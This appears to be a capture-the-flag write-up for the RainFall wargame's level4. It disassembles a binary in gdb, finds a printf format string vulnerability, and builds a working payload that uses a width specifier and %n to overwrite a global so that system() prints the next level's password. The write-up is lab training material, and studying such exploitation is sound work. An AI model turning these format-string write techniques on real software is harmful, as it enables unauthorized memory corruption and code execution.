Dump of assembler code for function main:
   0x080484a7 <+0>:	push   ebp
   0x080484a8 <+1>:	mov    ebp,esp
   0x080484aa <+3>:	and    esp,0xfffffff0
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave  
   0x080484b3 <+12>:	ret    
End of assembler dump.

Nothing interesting , we just call the n() function

Dump of assembler code for function n:
   0x08048457 <+0>:	push   ebp
   0x08048458 <+1>:	mov    ebp,esp
   0x0804845a <+3>:	sub    esp,0x218
   0x08048460 <+9>:	mov    eax,ds:0x8049804
   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>:	lea    eax,[ebp-0x208]
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    eax,[ebp-0x208]
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    eax,ds:0x8049810
   0x08048492 <+59>:	cmp    eax,0x1025544
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret    
End of assembler dump.

0x08048460 <+9>:	mov    eax,ds:0x8049804
0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200
0x08048471 <+26>:	lea    eax,[ebp-0x208]
0x08048477 <+32>:	mov    DWORD PTR [esp],eax
0x0804847a <+35>:	call   0x8048350 <fgets@plt>

call to fgets buffer position is [ebp-0x208] , size is 0x200, ds:0x8049804 is STDIN

0x0804847f <+40>:	lea    eax,[ebp-0x208]
0x08048485 <+46>:	mov    DWORD PTR [esp],eax
0x08048488 <+49>:	call   0x8048444 <p>

we call the p() function with the buffer address as parameter

0x0804848d <+54>:	mov    eax,ds:0x8049810
0x08048492 <+59>:	cmp    eax,0x1025544
0x08048497 <+64>:	jne    0x80484a5 <n+78>

we check if the content of the 0x8049810 address is equal to 0x1025544, if not we jump to <+78> (leave)

Otherwise:

(gdb) x/s 0x8048590
0x8048590:	 "/bin/cat /home/user/level5/.pass"

the pass for the next level will be printed.


(gdb) disassemble p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:	mov    DWORD PTR [esp],eax
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave  
   0x08048456 <+18>:	ret    
End of assembler dump.

We call printf, just like in the previous level there is a format string vulnerability.

level4@RainFall:~$ ./level4 
AAAA %x %x %x %x %x %x %x %x %x %x %x %x
AAAA b7ff26b0 bffff694 b7fd0ff4 0 0 bffff658 804848d bffff450 200 b7fd1ac0 b7ff37d0 41414141

now the 12th argument matches our first 4 bytes 

0x8049810 to little endian is : "\x10\x98\x04\x08"

we need the value to be equal to 0x1025544

(gdb) p/d 0x1025544
$1 = 16930116

now this is a problem, we can't make a buffer that is this high with just our padding and %n from printf, as the maximum size of the buffer is 0x200.

However, printf allows us to specify the width we want to use before printing

if we print the first argument with a with of 16930116 - 4, then print the 12th argument with %$12n we should be able to change the value of 0x8049810 to  16930116

python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' > /tmp/exploit is the command we need to get out flag now!

